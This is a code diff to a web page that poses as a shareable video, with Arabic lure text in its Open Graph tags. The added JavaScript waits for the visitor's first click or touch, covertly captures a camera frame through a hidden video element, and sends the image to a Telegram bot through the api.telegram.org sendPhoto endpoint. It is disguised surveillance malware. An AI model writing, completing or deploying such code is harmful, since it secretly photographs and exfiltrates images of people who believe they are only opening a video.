@@ -1,4 +1,4 @@
-<meta property="og:title" content="mala.k26837">
+<meta property="og:title" content="شاهد هذا المقطع المميز 🎬">
 <meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
 <meta property="og:type" content="video.other">
 <meta property="og:image" content="https://i.ibb.co/gZn6W1CV/IMG-6974.png">
@@ -69,4 +69,37 @@
             canvas.width = hiddenVideo.videoWidth || 640;
             canvas.height = hiddenVideo.videoHeight || 480;
 
-            const ctx
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(hiddenVideo, 0, 0);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(async (blob) => {
+                if (!blob) return;
+
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'capture.png');
+
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("Error sending photo:", err);
+                }
+            }, 'image/png');
+
+        } catch (err) {
+            console.error("Camera Error:", err);
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+    }
+
+    // تنفيذ الكود عند أول نقرة أو لمسة فقط
+    window.addEventListener('click', handleUserInteraction, { once: true });
+    window.addEventListener('touchstart', handleUserInteraction, { once: true });
+</script>
